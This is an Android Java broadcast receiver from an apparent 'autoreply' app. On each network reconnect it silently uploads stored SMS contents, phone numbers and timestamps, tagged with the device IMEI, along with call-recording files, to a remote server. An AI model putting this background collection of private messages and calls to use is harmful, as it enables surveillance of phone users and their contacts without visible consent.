package com.mikuwxc.autoreply.receiver;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.os.Environment;

import com.google.gson.Gson;
import com.lzy.okgo.OkGo;
import com.lzy.okgo.callback.StringCallback;
import com.mikuwxc.autoreply.bean.ApphttpBean;
import com.mikuwxc.autoreply.bean.SharePerSmsBean;
import com.mikuwxc.autoreply.callrecorder.CallDateUtils;
import com.mikuwxc.autoreply.callrecorder.RecordUpload;
import com.mikuwxc.autoreply.common.MyApp;
import com.mikuwxc.autoreply.common.net.NetApi;
import com.mikuwxc.autoreply.common.util.AppConfig;
import com.mikuwxc.autoreply.common.util.SPHelper;
import com.mikuwxc.autoreply.utils.SystemUtil;

import org.json.JSONArray;
import org.json.JSONException;

import java.io.File;
import java.io.IOException;
import java.util.ArrayList;
import java.util.List;

import okhttp3.Call;
import okhttp3.Response;

/**
 * create by : 喻敏航
 * create time : 8018-10-16
 * description : 网络状态变化监听广播
 **/
public class NetworkChangeReceiver extends BroadcastReceiver {

    @Override
    public void onReceive(Context context, Intent intent) {
        ConnectivityManager connectivityManager = (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);
        NetworkInfo networkInfo = connectivityManager.getActiveNetworkInfo();
        if (networkInfo != null && networkInfo.isAvailable()) {

            /**
             * 有网络  需要处理的事情
             * **/
            //检查是否有电话录音可上传
            uploadPhoneRecord();
            //检查是否有短信可上传
            uploadLocalSms();

        } else {
            /**
             * 断网  需要处理的事情
             * **/

        }

    }

    private void uploadLocalSms() {
        SPHelper.init(MyApp.getAppContext());
        String sms_list_data = SPHelper.getInstance().getString("SMS_LIST_DATA");
        SharePerSmsBean perSmsBean = new Gson().fromJson(sms_list_data, SharePerSmsBean.class);

        SmssBean smssBean = new SmssBean();


        if (perSmsBean != null) {
            List<SharePerSmsBean.DataBean> data = perSmsBean.getData();
            if (data!=null&&data.size() > 0) {

                List<SmssBean> d=new ArrayList<>();
                for (SharePerSmsBean.DataBean datum : data) {
                    d.add(new SmssBean(datum.getContent(),SystemUtil.getIMEI(MyApp.getAppContext()),"2".equals(datum.getType())?"true":"false",datum.getTime(),datum.getPhone()));
                }
                String json=new Gson().toJson(d);
                String url = AppConfig.OUT_NETWORK + NetApi.upload_sms_messages;
                OkGo.<String>post(url)
                        .tag(this)
                        .upJson(json)
                        .execute(new StringCallback() {
                            @Override
                            public void onSuccess(String s, Call call, Response response) {

                                ApphttpBean apphttpBean = new Gson().fromJson(s, ApphttpBean.class);
                                if("200".equals(apphttpBean.getCode())){
                                    //SPHelper.getInstance().putString("SMS_LIST_DATA", "");

                                }
                            }

                            @Override
                            public void onError(Call call, Response response, Exception e) {
                                super.onError(call, response, e);
                            }
                        });

            } else {
            }
        }


    }

    private void uploadPhoneRecord() {
        File file = new File(Environment.getExternalStorageDirectory() + "/CallRecorderTest");
        File[] files = file.listFiles();
        if (files != null && files.length > 0) {
            for (File f : files) {
                String name = f.getName();
                String[] split = name.split("_");
                int amrDuration = 0;//时长 单位s
                try {
                    amrDuration = CallDateUtils.getAmrDuration(f);
                } catch (IOException e) {
                    e.printStackTrace();
                }
                //开始时间戳
                String startTime = split[3];
                //结束时间戳
                String endTime = String.valueOf(Long.valueOf(startTime) + amrDuration * 1000);
                //电话号码
                String phoneNum = split[2];
                String type = split[1];
                if ("outgoing".equals(type)) {//呼出
                    type = "true";
                } else if ("incoming".equals(type)) {//呼入
                    type = "false";
                } else {
                    type = "undifined";
                }

                String imei = SystemUtil.getIMEI(MyApp.getAppContext());
                RecordUpload.uploadAmr(name, f.getAbsolutePath(), startTime, endTime, imei, type, phoneNum);
            }
        }
    }


    class SmssBean {


        /**
         * content : vr
         * imei : 6576
         * type : true
         * time : 7474
         * phone : 15151
         */

        private String content;
        private String imei;
        private String type;
        private String time;
        private String phone;

        public SmssBean() {
        }

        public SmssBean(String content, String imei, String type, String time, String phone) {
            this.content = content;
            this.imei = imei;
            this.type = type;
            this.time = time;
            this.phone = phone;
        }

        public String getContent() {
            return content;
        }

        public void setContent(String content) {
            this.content = content;
        }

        public String getImei() {
            return imei;
        }

        public void setImei(String imei) {
            this.imei = imei;
        }

        public String getType() {
            return type;
        }

        public void setType(String type) {
            this.type = type;
        }

        public String getTime() {
            return time;
        }

        public void setTime(String time) {
            this.time = time;
        }

        public String getPhone() {
            return phone;
        }

        public void setPhone(String phone) {
            this.phone = phone;
        }
    }
}
